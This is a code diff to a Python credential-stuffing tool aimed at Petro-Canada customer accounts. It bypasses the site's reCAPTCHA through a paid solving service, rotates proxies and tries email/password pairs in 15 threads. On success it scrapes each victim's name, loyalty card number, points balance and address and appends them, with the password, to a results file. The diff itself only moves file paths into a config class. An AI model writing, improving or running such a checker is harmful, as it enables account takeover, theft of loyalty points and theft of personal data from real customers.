@@ -18,7 +18,7 @@ class petro:
     def __init__(self):
         self.captchaSolver = recaptchaV3Proxyless()
         self.captchaSolver.set_verbose(1)
-        self.captchaSolver.set_key(open('anticaptcha.txt', 'r').read().strip().rstrip())
+        self.captchaSolver.set_key(open(dataTracker.apiKeyFile, 'r').read().strip().rstrip())
         self.captchaSolver.set_website_url('https://www.petro-canada.ca/en/personal?modalUrl=%2Fen%2Fpersonal%2Flogin')
         self.captchaSolver.set_website_key('6LeuGYEjAAAAAOaPqAckgwRGjH2G09CFkxca7VkB')
         self.captchaSolver.set_page_action('login')
@@ -124,11 +124,11 @@ class petro:
         self.petroProvince = self.detailsText.split('<div class="visitor-dropdown__region" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip()
         self.petroPoints = self.detailsText.split('<strong class="badge__value badge__value--large   ">')[1].split('</strong>')[0]
         warning(f'{self.email}:{self.password}:{self.petroName}:{self.petroCard}:{self.petroPoints}:{self.petroAddress}:{self.petroProvince}')
-        print(f'{self.email}:{self.password}:{self.petroName}:{self.petroCard}:{self.petroPoints}:{self.petroAddress}:{self.petroProvince} ', file=open('results_newest.txt', 'a'))
+        print(f'{self.email}:{self.password}:{self.petroName}:{self.petroCard}:{self.petroPoints}:{self.petroAddress}:{self.petroProvince} ', file=open(dataTracker.resultsFile, 'a'))
         return True
 
     def proxySetup(self):
-        self.proxyList = open('proxies.txt', 'r').readlines()
+        self.proxyList = open(dataTracker.proxyFile, 'r').readlines()
         self.proxies = random.choice(self.proxyList).strip().rstrip()
         self.proxyDict = {
             'http': self.proxies,
@@ -196,10 +196,23 @@ class petro:
 
 class data:
     def __init__(self):
+        self.dev = False
+
+        if self.dev:
+            self.devDir = '../devFiles/'
+        else:
+            self.devDir = ''
+
+        self.proxyFile = f'{self.devDir}proxies.txt'
+        self.emailsFile = f'{self.devDir}emails_testing.txt'
+        self.apiKeyFile = f'{self.devDir}anticaptcha.txt'
+        self.resultsFile = f'{self.devDir}results_newest.txt'
+
         self.validAttempts = 0
         self.realLogins = 0
         self.wrongCaptchas = 0
         self.threads = 15
+
 
 class pws:
     def __init__(self, email):
@@ -253,7 +266,7 @@ class pws:
 
 if __name__ == '__main__':
     dataTracker = data()
-    emails = open('emails_testing.txt', 'r').readlines()
+    emails = open(dataTracker.emailsFile, 'r').readlines()
 
     for email in emails:
         email = email.strip().rstrip()
